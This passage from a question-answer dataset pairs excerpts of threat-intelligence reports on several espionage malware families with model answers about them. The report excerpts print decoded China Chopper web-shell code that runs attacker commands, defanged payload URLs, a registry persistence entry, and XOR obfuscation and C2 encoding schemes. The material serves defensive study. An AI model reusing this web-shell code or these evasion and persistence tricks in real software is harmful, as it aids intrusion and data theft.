enabled.\nMedium Headline: 1. Infection Method\nUsers are targeted via specially crafted phishing emails and prompted to open a Microsoft Word decoy document containing malicious macros.\nIf macros are disabled, users are presented with a dialog box (below) prompting them to enable macros. The dialog box is well designed and appears to be an authentic Microsoft Office message.\nRussian text in dialog box: \"\u0432\u043d\u0438\u043c\u0430\u043d\u0438\u0435! \u0424\u0430\u0439\u043b \u0441\u043e\u0437\u0434\u0430\u043d \u0432 \u0431\u043e\u043b\u0435\u0435 \u043d\u043e\u0432\u043e\u0439 \u0432\u0435\u0440\u0441\u0438\u0438 \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u044b \u041c\u0438\u043a\u0440\u043e\u0441\u043e\u0444\u0442 Office. \u041d\u0435\u043e\u0431\u0445\u043e\u0434\u0438\u043c\u043e \u0432\u043a\u043b\u044e\u0447\u0438\u0442\u044c \u041c\u0430\u043a\u0440\u043e\u0441\u044b \u0434\u043b\u044f \u043a\u043e\u0440\u0440\u0435\u043a\u0442\u043d\u043e\u0433\u043e \u043e\u0442\u043e\u0431\u0440\u0430\u0436\u0435\u043d\u0438\u044f \u0441\u043e\u0434\u0435\u0440\u0436\u0438\u043c\u043e\u0433\u043e \u0434\u043e\u043a\u0443\u043c\u0435\u043d\u0442\u0430\"\nThis is translated as: \"Attention! The file was created in a newer version of Microsoft Office programs. You must enable macros to correctly display the contents of a document.\"\nBased on the document metadata, the language in which the list is written is Ukrainian, but the original language of the document is Russian.\nThe creator of the decoy document creator is named \"Siada.\"\nLast modified date is 2016-12-22 10:37:00\nThe document itself (below) shows a list of military personnel with personal details such as birthdate and address:\nDecoy document with personal information about military personnel\nSmall Headline: Russian social media site from where icon for dropper EXE was obtained\nThe dropper has 2 DLLs stored in its resources; they are XOR'ed in such way that the current byte is XOR'ed with the previous byte.\nThis technique is much better than just plain XOR because it results in a byte distribution that doesn't look like a normal Portable Executable (PE) file loader. This helps obfuscate the file so that it will not be detected by anti-virus systems.\nThe DLLs are extracted into the app data folder:\n%USERPROFILE%\\AppData\\Roaming\\Microsoft\\VSA\\.nlp \u2013 Stage 1\n%USERPROFILE%\\AppData\\Roaming\\Microsoft\\Protect\\.nlp.hist \u2013 Stage 2\nThe first stage is executed and the DLL is loaded using (<https://attack.mitre.org/wiki/Technique/T1055>)Reflective DLL Injection.\nMedium Headline: 5. Dropper \u2013 Stage 2 \u2013 Downloader for Main Module\nInternal name: esmina.dll\nCompiled: Mon Oct 10 14:47:28 2016\nThe main purpose of this DLL is to download the main module\nThe main module is hosted on a free web hosting site with the following URL:\nwindows-problem-reporting.site88.net [Note: Do not visit this malicious site.]\nWe were unable to find any information about this URL in public data sources.\nAttempting to directly access the URL leads to an \"HTTP/1.1 404 Not Found\" message.\nIt appear as if downloading the module requires manual approval, indicating the need for a human analyst or handler in the loop.\nThe main module is then downloaded and loaded into memory using Reflective DLL Injection.\nMedium Headline: 6. Main Module\nThe main module downloads the various data-stealing plugins assigned to each victim, and executes them.\nIt also collects locally-stored stolen data and uploads it to Dropbox.\nThe main module incorporates a number of anti-Reverse Engineering (RE) techniques:\nChecks if a debugger is present.\nChecks if process is running in a virtualized environment.\nChecks if (<https://www.microsoft.com/security/sir/strategy/default.aspx#!malwarecleaning_explorer>)ProcessExplorer is running. ProcessExplorer is used to identify malware hiding inside a legitimate process as\na DLL, which occurs as a result of DLL injection.\nChecks to see if (<https://www.quora.com/How-can-I-use-Wireshark-to-detect-malicious-connections-on-my-computer>)WireShark is running. WireShark can be used to identify malicious traffic originating on your computer.\nIt registers itself in the registry under the key:\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\hlpAsist\nRUNDLL32 \"%USERPROFILE%\\AppData\\Roaming\\Microsoft\\MSDN\\iodonk18.dll\", IDLE\nMedium Headline: 9. Data-Stealing Plugins\nFile Collector: Searches for variety of file types that are stored locally or on shared drives (including doc, docx, xls, xlsx, ppt, pptx, pdf, zip, rar, db, txt) . Files are uploaded on-demand.\nUSB File Collector: Searches for variety of file types on USB drives (including doc, docx, xls, xlsx, ppt, pptx, pdf, zip, rar, db, txt).\nBrowser Data Collector: Used to steal passwords and other sensitive information stored in browsers.\nMicrophone: Captures audio conversations.\nComputer Info Collector: Collects data about the client such as Windows OS version, computer name, user name, IP address, MAC address, antivirus software, etc.\nNot all of the plugins are downloaded to every target. Each module has a unique extension which is the client ID. This is how the main module knows which modules should be downloaded to a particular target.\nBig Headline: Conclusions\n1) Operation BugDrop was a cyber-reconnaissance mission; its goal was to gather intelligence about targets in various domains including critical infrastructure, media, and scientific research. We have no evidence that any damage or harm has occurred from this operation, however identifying, locating and performing reconnaissance on targets is usually the first phase of operations with broader objectives.\n2) Skilled hackers with substantial financial resources carried out Operation BugDrop. Given the amount of data analysis that needed to be done on daily basis, we believe BugDrop was heavily staffed. Given the sophistication of the code and how well the operation was executed, we have concluded that those carrying it out have previous field experience. While we are comfortable assigning nation-state level capabilities to this operation, we have no forensic evidence that links BugDrop to a specific nation-state or group. \"Attribution\" is notoriously difficult, with the added difficulty that skilled hackers can easily fake clues or evidence to throw people off their tail.\n3) Private and public sector organizations need to continuously monitor their IT and OT networks for anomalous activities indicating they've been compromised. Fortunately, new algorithmic technologies like behavioral analytics are now available to rapidly identify unusual or unauthorized activities with minimal false positives, especially when\ncombined with actionable threat intelligence. Organizations also need deep forensics to identify the scope and impact of a breach, as well as an enterprise-wide incident response plan that can be carried out quickly and at scale.\nAppendix\nHashes (SHA-256)\nDecoy Document:\n997841515222dbfa65d1aea79e9e6a89a0142819eaeec3467c31fa169e57076a\nDropper: f778ca5942d3b762367be1fd85cf7add557d26794fad187c4511b3318aff5cfd\n\nQuestion: How does Operation BugDrop employ encryption to evade detection by common anti-virus and sandboxing systems? Explain the technique used and its effectiveness.\n\nAnswer:",
    "output": "Operation BugDrop uses encrypted DLLs to avoid detection by common anti-virus and sandboxing systems. The technique involves XOR'ing the DLLs in such a way that the current byte is XOR'ed with the previous byte. This results in a byte distribution that doesn't look like a normal Portable Executable (PE) file loader, effectively obfuscating the file and making it harder for anti-virus systems to detect.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Closed dynamic show of modern and prospective samples of military armament and special equipment for the \"reconnaissance and raid action of combined-arms units\"\nWhile the is open to anyone, organizers from last year have set up specialized expositions that include \"behind closed doors.\" This caters to selected guests, where pieces of classified equipment are being displayed, including large aerial vehicles and missiles. That being said, we believe that this malicious document is being targeted to those selected guests who want to be, or are already included in these closed door invitations. This year's event has already 66 official foreign delegations their participation. We will take a look on how a PPSX file could compromise an unpatched system.\nBig Headline: Analysis\nWe begin with the malicious PPSX file that exploits and opens a bait file. CVE-2017-0199 is an HTA (HTML application) vulnerability that allows a malicious actor to download and execute a script containing PowerShell commands when a user opens a document containing an embedded exploit This is not the first time we have encountered an APT abusing this vulnerability. In fact, previous attacks have people from UN agencies, Foreign Ministries, and people and organizations who interact with international governments.\nOnce the PPSX file is opened, it triggers a script in ppt/slides/_rels/slides1.xml.rels. The exploit then downloads additional code from the remote server, as shown in figure 04, and executes it using the PowerPoint Show animations feature.\nShown below is the code from the remote server after the PowerShell exploit embedded in the XML file is successfully executed and downloads an executable payload into %Temp%.\nWhen executed, Defender.exe drops the following files:\n\u00b7 SynTPEnh \u2013 a directory with the BISKVIT malware package\n\u00b7 Csrtd.db \u2013 an encrypted configuration file used by DevicePairing.exe for autorun installation\n\u00b7 DevicePairing.exe \u2013 also identified in the code as \"AutorunRegistrator\", its function is to copy the SynTPEnh directory to %appdata% and add it to the autorun registry entry\n\u00b7 DevicePairing.exe.config \u2013 a runtime configuration file\n\u00b7 Kernel32.dll \u2013 a common library of BISKVIT malware\n\u00b7 Newtonsoft.Json.dll \u2013 a popular JSON serializer for .NET\nBig Headline: BISKVIT\nThe BISKVIT Trojan is a multi-component malware written in C#. We dubbed this malware BISKVIT based on the namespaces used in the code, which contain the word \"biscuit\". Unfortunately, there is already an existing unrelated malware called BISCUIT, so BISKVIT is used instead, which is the Russian translation of biscuit.\nDue to the modular nature of BISKVIT, it's difficult to exactly determine all of its functionalities since components are only downloaded and loaded on the fly at the direction of the attacker. As of this writing, we have only been able to download one component. So far, based on the code of the components that we were able to acquire, this malware is capable of, but not limited to the following:\n\u00b7 Downloading files and components\n\u00b7 Hidden/stealthy execution of downloaded and local files\n\u00b7 Downloading of dynamic configuration files\n\u00b7 Updating itself\n\u00b7 Deleting itself\nThe BISKVIT malware is copied to the %appdata%\\ SynTPEnh from the %temp% folder, as mentioned above. These are the contents of the %appdata%\\SynTPEnh folder:\n\u00b7 SynTPEnh.exe \u2013 the main BISKVIT malware file\n\u00b7 Csrtd.db \u2013 an encrypted configuration file\n\u00b7 SynTPEnh.exe.config \u2013 a runtime configuration file\n\u00b7 Kernel32.dll \u2013 a common library of BISKVIT malware\n\u00b7 Newtonsoft.Json.dll \u2013 a popular JSON serializer for .NET\nThe main BISKVIT file disguises itself as the legitimate Synaptics Pointing Device Driver file to avoid suspicion by the user.\nWhen executed, it initializes its base configuration, which contains the following information:\nIt then loads and decrypts its configuration file, named csrtd.db. This configuration file is encrypted with AES using the following keys:\nOnce decrypted, this configuration file contains the command and control server, the time interval used by the malware to check for jobs from the command and control server, an API key, and RSA key information. We didn't find code references to the RSA encryption method, so we think that's being used by other components that we haven't acquired as of this writing.\nBig Headline: Command and Control Communications\nThis malware communicates with the command and control server through REST APIs using the JSON format. The malware first gets an access token by sending an API key. If not specified in the configuration, the API key is generated from the CPU, disk drive, and MAC address information of the infected machine. This API key is a unique ID, which is also used to identify the machine.\nThe API key is sent to the command and control server via an HTTP POST request to the API /api/auth/token.\nThe server replies with access token information that will be used for the entire session.\nThis malware then receives and executes commands from the attacker through a jobs API. It sends an HTTP GET request to the API /api/job to get a job after a certain time has lapsed, as indicated by the interval set in the configuration.\nThe response would be a job with four main keys: id, resultUri, tasks, and executionOptions.\n\u00b7 id - is the job ID\n\u00b7 resultUri - is where the malware will HTTP POST the result of the job\n\u00b7 executionOptions - tells the malware if it will execute the package at certain time interval, and if it will be started at startup.\n\u00b7 tasks \u2013 this key contains information about packages (components/other files) that the attacker wants downloaded to and executed on the infected machine.\nThe executeMode in the key tasks tells the malware how to execute the package.\nIf the mode is 0, the package is treated as a component/library and is executed with the parameter indicated in the parameters key.\nIf the mode is 1, the package is treated as a file and is executed by using either the ShellExecuteEx() or CreateProcess() Windows API, with WindowStyle set to Hidden and CreateNoWindow set to true.\nIf the mode is 2, the package is treated as file and is executed using the\nCreateProcessAsUser() Windows API.\nAnother interesting feature of this malware is that it saves jobs locally in a folder named 534faf1cb8c04dc881a3fbd69d4bc762.\nJobs are encrypted using the same AES encryption as that of the configuration file, and are named with its job id with a .db extension. This means that it can continue executing the jobs on the next execution of the malware even when its current process is interrupted or terminated. After completing the job, this malware deletes the locally saved job.\nDuring our analysis, the malware received a job to download a package with executeMode set to 0. This means the package is a component/library that can be downloaded from /api/package/5b61b91da99a25000198dfcc.\nThe package from the downloadUri specified in the job resulted to a zip file with a PK header.\nPackages are stored in the folder 083c57797944468895820bf711e3624f.\nAfter checking what component had been downloaded, we discovered that it was a component called FileExecutor, which just executes the files indicated in the parameters key.\nThis FileExecutor component has the same functionality as the executeMode set to 1, which just executes a file using either the ShellExecuteEx() or CreateProcess() with WindowStyle set to Hidden and CreateNoWindow set to true. In the above job, it tells the malware to use the\nFileExecutor component to execute \"systeminfo\" with timeout set at 30 seconds, as indicated by the Waittime key.\nThe command systeminfo displays detailed configuration information about a computer and its operating system, including its operating system configuration, security information, product ID, and hardware properties (such as RAM, disk space, and network cards).\nFor the C&C to know the status of the jobs running, it also includes the key State that has the values shown below. The data that was sent during our analysis included the State being equal to 2, meaning it is complete.\nAfter the systeminfo job, it seemed that the attacker noticed that the machine he/she sent the job to was an analysis machine, so the C&C stopped sending any jobs. This could only mean that the attacker behind this attack is being very careful to not infect computers that are not targets and to avoid alerts.\nWhile it is not new for C&C servers used in targeted attacks to suddenly stop responding after collecting the basic information of the victim's computer, the C&C used here is not completely blocking its communication. Instead, it just stopped sending jobs. This enables researchers and analysts to still monitor the C&C.\nQ: How does the BISKVIT malware handle job execution and ensure persistence across system restarts, and what measures does it take to avoid detection?",
    "output": "The BISKVIT malware handles job execution by receiving tasks from the command and control server, which are encrypted using AES and stored locally in a folder named 534faf1cb8c04dc881a3fbd69d4bc762. Jobs are named with their job ID and a .db extension. This allows the malware to continue executing jobs even if its current process is interrupted or terminated. To ensure persistence, the malware copies the SynTPEnh directory to %appdata% and adds it to the autorun registry entry using DevicePairing.exe. To avoid detection, the malware disguises itself as the legitimate Synaptics Pointing Device Driver file and executes tasks with window styles set to Hidden and CreateNoWindow set to true, ensuring stealthy operation.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: The UpDocX Malware\nDuring our research into FIN4's malicious macros, we identified a sample, d102693540b53f9a564e3a550f938709, which contains similar code to the malicious macros cited in previously documented samples, such as the form display and the subroutine uploadPOST, an example of which is given below:\nHowever, in our sample the macro code differs, in that it uses URLDownloadToFile to download an executable named WINWORD32.exe - this can be seen below.\nUsing this inbuilt Windows functionality, the macro downloads and executes a file located at the following URL:\nhttp://www.advantarlabs[.]com/plugins/extension-\u00adxtd/WINWORD32.exe\nDue to the command and control filename as shown in the htmlUpload function below, we refer to this malware as UpDocX:\nUpDocX was written in VB.NET and compiled without any attempts at obfuscating the source code. There is also no attempt in obfuscating C2 network traffic. It has limited functionality and appears to be a simple backdoor used solely for keylogging and uploading documents to designated C2 servers.\nThe attackers have, however, put some effort into avoiding detection and hindering investigations. UpDocX has a list of extensive clean-up functions responsible for eliminating evidence of compromise, which indicates a degree of caution often not observed in targeted attacks.\nWe believe that one of the authors of UpDocX may be a French speaker, based on naming conventions used in the malware.\nPwC threat intelligence customers can access a more detailed technical analysis of UpDocX, additional indicators associated with FIN4 and our most recent profile of the group, in report reference CTO-TAP-20150518-01A.\n[1] http://www.reuters.com/article/2015/06/23/us-hackers-insidertrading-idUSKBN0P31M720150623\n[2] https://www2.fireeye.com/rs/fireye/images/rpt-fin4.pdf\n[3] https://www.esentire.com/wp-content/uploads/2013/11/esentire_alert_20131108_DOCM.pdf\n[4] http://www.symantec.com/security_response/writeup.jsp?docid=2014-052813-3721-99&tabid=2\nTweet\n\u00ab Neutrino Exploit Kit delivers zero-detection Zeus Variant\nMain\n|\n\nAnswer this question based on the above context: How does the UpDocX malware, associated with the FIN4 threat actor, differ from previously documented malicious macros in terms of its execution and functionality? Additionally, what measures have been taken by the attackers to avoid detection and hinder investigations?",
    "output": "The UpDocX malware differs from previously documented malicious macros in that it uses the URLDownloadToFile function to download an executable named WINWORD32.exe from a specified URL. This executable is then run using built-in Windows functionality. The malware itself is written in VB.NET and lacks any attempts at obfuscating the source code or C2 network traffic. Its primary functionalities are keylogging and uploading documents to designated command and control (C2) servers. To avoid detection and hinder investigations, UpDocX includes extensive cleanup functions designed to eliminate evidence of compromise, indicating a level of caution not typically observed in targeted attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "THE VOHO CAMPAIGN: AN IN DEPTH ANALYSIS\nRSA FirstWatchSM Intelligence Report\nWhite Paper\nAbout RSA FirstWatchSM Team\nRSA FirstWatchSM team is an elite, highly trained global threat research and intelligence team designed to operate in a number of disciplines to provide tactical and strategic intelligence on advanced threats, threat campaigns and threat actors.  The team, lead by Will Gragido, focuses on advanced threat research and intelligence which culminates in threat feeds, digests, profiles and ecosystem analysis designed to aid the RSA NetWitness\u00ae user community and the information security community at large in contending with these challenges.\nContributing Authors\nAlex Cox, Principal Researcher, RSA FirstWatch Team\nChris Elisan, Principal Malware Researcher, RSA FirstWatch Team\nWill Gragido, Sr.Manager, RSA FirstWatch Team\nChris Harrington, Consulting Security Engineer, EMC CIRC\nJon McNeill, Principal Technologist, RSA FirstWatch Team\nIn July of 2012, the RSA FirstWatchSM research and intelligence team identified an emerging malicious code and content campaign spreading at a rapid rate within very specific geographic theaters. These clusters were confined to ten geographic areas and involved thousands of hosts. To the untrained eye it would appear the hosts involved in this campaign were compromised as the result of innocent web surfing using a common \u2022drive-by\u2022 attack mechanism. While at face value this is true, our investigation infers that the populations compromised were not chosen in an indiscriminate manner, but rather with great forethought. Based on the RSA FirstWatch research, we believe these websites were likely chosen with exact precision and great consideration; selected from thousands upon thousands of websites due to familiarity and proximity to the targets of interest that the threat actors responsible for the campaign were truly interested in compromising.\nThe RSA-FirstWatch team\u2022s research led to the identification of this campaign and its name, \u2022VOHO\u2022. From a tools, technique and procedure (TTP) perspective, the RSA FirstWatch team believes this campaign aligns with the Advanced Persistent Threat (APT) threat model, including communications emitting from compromised hosts to IP addresses confirmed as Command and Control (C2) servers (in this case, located in Hong Kong); code re-use using exploit scripts and ultimately, a before-unseen variant of \u2022Gh0st RAT\u2022 malware. Additionally, targets appeared to be specifically chosen to compromise hosts involved in business and local governments in Washington, DC and Boston, Massachusetts, as well as organizations involved the development and promotion of democratic process in non-permissive regions. As a whole, these specific TTPs have been observed in previous APT attack campaigns, most notably, Auroraand Ghostnet.\nThrough our research, the RSA FirstWatch team identified what it believes to be the primary mechanism for tactical and strategic infection of victims affiliated with targets of opportunity. While this attack methodology has been observed before, it has not been widely documented or disseminated. As such, we have termed this technique \u2022Water Holing\u2022.\nThe architects of these campaigns survey and select the websites (known as pivot or redirector sites) leveraged in these attacks carefully. Weighing their geographic relevance, proximity to their desired targets of opportunity, and likelihood of being traversed by potential victim-users associated with the attacker objective, the adversary carefully exploits vulnerable systems and inserts malicious scripts to deliver a Trojan payload via browser-based exploits to visitors to the website.\nThroughout this paper, we will examine the evolution of this threat campaign, its ties to other comparable threat campaigns where variants of the malicious payload seen in this attack (gh0strat) have been identified and chronicled, epicenters of geographic activity associated with this campaign, industry/verticals targeted in this campaign and the construction of the attribution chain.\nBig Headline: Specifics\nUsing the tactic of crafting a \u2022Watering Hole\u2022, the majority of the redirection activity occurred because of JavaScript elements on two specific websites.\n\u2022 hxxp://www.xxxxxxxxtrust.com\n\u2022 hxxp://xxxxxxcountymd.gov\nRespectively, these two sites \u2022 one a regional bank in Massachusetts and a local government serving the Washington DC suburbs.\nWe also saw an additional chain of websites with a geopolitical central theme redirecting to the exploit site:\n\u2022 hxxp://ifxx.org\n\u2022 hxxp://xxxxxxcenter.org\n\u2022 hxxp://xxi.org\n\u2022 hxxp://xxxxxxx.prio.no\n\u2022 hxxp:/xxxxxxxxpolitics.com\n\u2022 hxxp://www.rfxxx.org\nAdditionally, sites serving the Defense Industrial Base and Educational community were also observed redirecting to the exploit site:\n\u2022 hxxp://www.gftxxx.org\n\u2022 hxxp://www.xxxxxxantennas.com\nWhen taken as a whole, this campaign appears to have targeted:\n\u2022 Boston, Massachusetts area users\n\u2022 Political Activists\n\u2022 Users Washington, DC and its suburbs\n\u2022 Defense Industrial Base\n\u2022 Education\nSmall Headline: hxxp://xxxxxxxcurling.com Compromise\nFiles found on the sporting group website indicate that this server was likely compromised with a remote buffer overflow (CVE-2008-3869/CVE-2008-3870) against the server\u2022s sadmind daemon. Additional files indicated the ability to establish a remote shell on demand.\nIt is unknown if this method was also used to compromise the \u2022watering hole\u2022 sites. In these cases, the following code snipped was added to publically accessible pages on the site, typically .js files are used to process a site\u2022s JavaScript:\nThis is a simple redirection mechanism that will cause the browser to redirect and load content from the remote site. Hits to \u2022iframe.js\u2022 launch an enumeration and exploit chain that attempts to exploit two different vulnerabilities,\nGh0st RAT is a multiple-purpose remote access tool that allows extensive remote control of compromised hosts. While there is no known evidence linking this attack to previous attacks, gh0st has historically been used in politically motivated espionage by nation-state attackers, in a similar manner as seen in this campaign depending on the specific redirection path:\n\u2022 Microsoft XML Core Services \u2022 CVE-2012-1889\n\u2022 Java Exploit \u2022 CVE-2012-1723\nBig Headline: Phase 1 - Exploit Chain \u2022 Microsoft XML Core Services\nFrom our research, this campaign occurred between June 25th , 2012 and July 18th 2012 in which attackers sought to exploit the CVE-2012-1889 vulnerability that was zero-day and was being used in targeted attacks as noted in early June.\nIn this attack, a successful exploit on CVE-2012-1889 followed the following path:\n[Watering Hole Sites]\n\uf0e0\nhttp://xxxxxxcountymd.gov (or other water hole site)\n\uf0e0\nhttp://www.xxxxxxxcurling.com/Results/cx/magma/iframe.js\n\uf0e0\nhttp://www.xxxxxxxcurling.com/Results/cx/magma/module.php\n\uf0e0\n\uf0e0\n\uf0e0\nhttp://www.xxxxxxxcurling.com/Results/cx/magma/engine.js http://www.xxxxxxxcurling.com/Results/cx/magma/if.htm http://www.xxxxxxxcurling.com/Results/cx/magma/enblue.htm http://www.xxxxxxxcurling.com/Results/cx/magma/book.cab\n.\nFigure 1: iFrame.js Flow\nMedium Headline: Engine.js\nEngine.js looks for processes related to the following antivirus engines using an older vulnerability in Internet Explorer (CVE-2007-4848) that allows local file enumeration:\n\u2022 Trend Micro\n\u2022 McAfee\n\u2022 Symantec\nHowever, the results of this check don\u2022t change the outcome of the script running in all cases; it simply results in the loading of \u2022if.htm\u2022. We believe this to be a case of existing exploit script re-use, with slight changes to suit the attackers current purpose.\nFigure 2: Website Where xKungFoo Script Originates\nFigure 3: Example of xKungFoo Script Originates\nFigure 4: Endorsement by Author Regarding xKungFoo\nThis particular enumeration script was seen previously in APT-style attacks back in July of 2011, as detailed here on the contagiodump blog. Within the blog, noted industry researcher Mila Parkour, cited the presence and use of borrowed scripts having likely originated in Asia, specifically the so called xKungfoo script in attacks launched associated with numerous campaigns targeted at political dissidents.Additionally, Ms. Parkour has also noted and documented the presence of this weaponizable code in numerous locales on the Internet today.In the following figures evidence of the presence and availability of the xKungFoo script (the script referenced by Mila Parkour and noted as being germane to the RSA FirstWatch investigation) along with endorsement by the author can be seen:\nQuestion: How did the VOHO campaign utilize the 'Watering Hole' technique to target specific groups, and what were the primary mechanisms for tactical and strategic infection?",
    "output": "Answer: The VOHO campaign utilized the 'Watering Hole' technique by carefully surveying and selecting websites that were likely to be visited by their intended targets. These websites, known as pivot or redirector sites, were chosen based on their geographic relevance, proximity to desired targets, and the likelihood of being traversed by potential victims. The adversaries exploited vulnerable systems on these sites and inserted malicious scripts to deliver a Trojan payload via browser-based exploits. The primary mechanisms for infection included JavaScript elements on two specific websites: a regional bank in Massachusetts and a local government site serving the Washington DC suburbs. Additional chains of websites with geopolitical themes, as well as those serving the Defense Industrial Base and Educational community, were also observed redirecting to the exploit site.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: 2.5. The StoneDrill backdoor\nAccording to the PE timestamps from StoneDrill sample two and sample one (2016.10.19 and 2016.11.14 respectively), this malware file was compiled a month before the previously described StoneDrill sample. However, internally this tool wrapper (injector) looks like a more modern evolution of the previously discussed wiper wrapper.\nThe sample is generally of low quality, with many unused code blocks, unreliable anti-emulation and few non critical bugs. In some cases functions are executed but the results are not used:\n\u25cf Is the current user a domain administrator?\n\u25cf Is the antivirus process currently running?\n\u25cf Is the current process running in a virtual environment such as VMware or VirtualBox?\nSmall Headline: 2.6.3. Third step\nWhen the malware is started from within the \"%COMMON_APPDATA%\\Chrome\" folder, the \"FileInfo.txt\" file is created in the same folder and contains the pathname of the first copy of malware (\"%COMMON_APPDATA%\\Chrome\\%SELECTED_NAME%.exe\")\nThen the third copy of the malware is created by the command \"%COMSPEC% /c copy \"%SELFNAME\" %TEMP%\\bd891.tmp\", which checks the target file to verify if command execution is successful, then deletes the bd891.tmp file. The last mentioned is used as another anti-emulation trick in the StoneDrill arsenal.\n\nHow does the StoneDrill backdoor employ anti-emulation techniques, and what are the implications of these techniques for detecting and analyzing the malware?",
    "output": "The StoneDrill backdoor employs several anti-emulation techniques to evade detection and analysis. One such technique involves checking if the current user is a domain administrator, if an antivirus process is running, and if the process is executing in a virtual environment such as VMware or VirtualBox. These checks are designed to determine if the malware is being run in a controlled environment, such as those used by security researchers for analysis. By performing these checks, the malware can avoid executing its payload when it detects that it is being observed, making it harder for analysts to understand its behavior. Additionally, the malware creates a 'FileInfo.txt' file in the '%COMMON_APPDATA%\\\\Chrome' folder containing the pathname of the first copy of the malware. It then copies itself to a temporary location and verifies the success of the copy operation before deleting the temporary file. This series of actions serves as another anti-emulation trick, further complicating the analysis process.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Platform\nChina Chopper can run on any Web server capable of running JSP, ASP, ASPX, PHP, or CFM\u2014the majority of Web application languages. China Chopper can also run transparently on both Windows and Linux. This OS and application flexibility make China Chopper an even more dangerous Web shell.\n\"Server-side Payload Component\" on Page 5 showed China Chopper executing on a Windows 2003 IIS server using ASPX. Figure 19 shows it running on Linux with PHP. Here, the contents of the PHP version are just as minimalistic.\nWhile the available options differ depending on what platform China Chopper is running on, the file management features in Linux (see Figure 20) are similar to those in Windows.\nThe database client example shown in Figure 21 is MySQL instead of MS-SQL, but it offers many of the same capabilities.\nThe virtual terminal looks familiar (Figure 22), but uses Linux commands instead of Windows because they are ultimately interpreted by the underlying operating system.\nBig Headline: Delivery Mechanism\nChina Chopper's delivery mechanism is flexible due to the size, format, and simplicity of the malware's payload. This small, text-based payload can be delivered using any of the following mechanisms:\n\u2022 WebDAV file upload\n\u2022 JBoss jmx-console or Apache Tomcat management pages (For more details on this attack vector, read FireEye consultant Tony Lee's explanation)6\n\u2022 Remote exploit with a file drop\n\u2022 Lateral propagation from other access\nBig Headline: Traffic Analysis\nAfter examining the server-side payload and the client used to control the Web shell, the next step to understanding China Chopper is observing its traffic. Having both the server and client components enables researchers to start a packet capture to view the contents of typical traffic. As shown in Figure 23, the client initiates the connection over TCP port 80 using the HTTP POST method.\n6 Tony Lee. \"Manually Exploiting Tomcat Manager.\" September 2012.\nBecause this is TCP traffic, researchers can \"follow the TCP\" stream in Wireshark, a popular open-source network-protocol analyzer that works in Unix and Windows.7 In Figure 24, the traffic in red at the top is from the attacker (Web client). The traffic shown in blue at the bottom is the response from the target (Web shell).\n7 Wireshark is available at http://www.wireshark.org/.\nAs highlighted above, the majority of the attacker traffic appears to be Base64 encoded. This is not a problem though, because it can be easily decoded. Using the \"TextWizard\" feature of the free Fiddler Web debugger reveals what the attacker is sending.8\n(Note: %3D is a URL-encoded representation of the equal sign (\"=\"). Fiddler needs this to be converted to an equal sign for proper decoding.)\nRaw attacker traffic:\nAs shown In Figure 25, the Fiddler Web debugger text wizard easily converts the raw traffic from Base64 to plain text.\n8 Fiddler is available at http://fiddler2.com/.\nDecoded traffic:\nvarc=newSystem.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding(65001). GetString(System.Convert.FromBase64String(Request.Item[\"z1\"]))); vare=newSystem.Diagnostics.Process(); varout:System.IO.StreamReader,EI:System.IO.StreamReader;\nc. UseShellExecute=false; c.RedirectStandardOutput=true;c.RedirectStandardError=true;\ne.StartInfo=c;c.Arguments=\"/c\"+System.Text.Encoding.GetEncoding(65001) . GetString(System.Convert.FromBase64String(Request.Item[\"z2\"])); e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();\nResponse.Write(out.ReadToEnd()+EI.ReadToEnd());\nThe decoded traffic presents something more readable. But the Base64-decoded traffic shows an attempt to decode more Base64 traffic stored as \"z1\" and \"z2.\" The attacker traffic shows z1 and z2 parameters immediately after the end of the \"Password\" parameter.\nThe Base64-encoded parameters z1 and z2 are highlighted in the following output:\n&z1=Y21k&z2=Y2QgL2QgImM6XGluZXRwdWJcd3d3cm9vdFwiJndob2FtaSZlY2hvIFtTXSZ jZCZlY2hvIFtFXQ%3D%3D\nBase64-decoded parameters z1 and z2:\nz1=cmdz2=cd /d \"c:\\inetpub\\wwwroot\\\"&whoami&echo [S]&cd&echo [E]\nThis code explains how the client communicates with the shell. The \"Password\" parameter passes the code to the payload to be executed. The z1 is cmd, and z2 contains the arguments to the command prompt sent via cmd /c. All output is sent to standard output (stdout) back to the attacker, which creates the following response to the whoami command and the present working directory:\n->|nt authority\\network service[S]C:\\Inetpub\\wwwroot[E]|<-\nRead the text above and answer this question: What are the various delivery mechanisms for China Chopper, and how do these mechanisms leverage the characteristics of its payload?",
    "output": "China Chopper's delivery mechanism is flexible due to the size, format, and simplicity of the malware's payload. The small, text-based payload can be delivered using several methods, including WebDAV file upload, JBoss jmx-console or Apache Tomcat management pages, remote exploit with a file drop, and lateral propagation from other access points. These delivery mechanisms leverage the compact and straightforward nature of the payload, making it easier to deploy across different environments and exploit vulnerabilities in web servers.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the backdoor in the 'ISIS_twitter_list.doc' malware communicate with its command and control (C2) server, and what steps are involved in decoding the encoded requests?",
    "output": "The backdoor communicates with its C2 server using an HTTP-based protocol, sending encoded requests to various pages such as 'login.asp', 'check.asp', 'result.asp', and 'upload.asp'. The request structure uses a modified base64 alphabet and includes an XOR encryption mechanism. To decode the request, you first base64 decode the request string using the alphabet 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+*'. Then, you use the first 16 bytes of the decoded string as an XOR key to decode the rest of the payload. The provided Python script demonstrates this process, using a rolling XOR function to decode the payload. The decoded request contains various fields separated by the delimiter '|', including a campaign identifier, hostname, username, timestamp, and version number.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
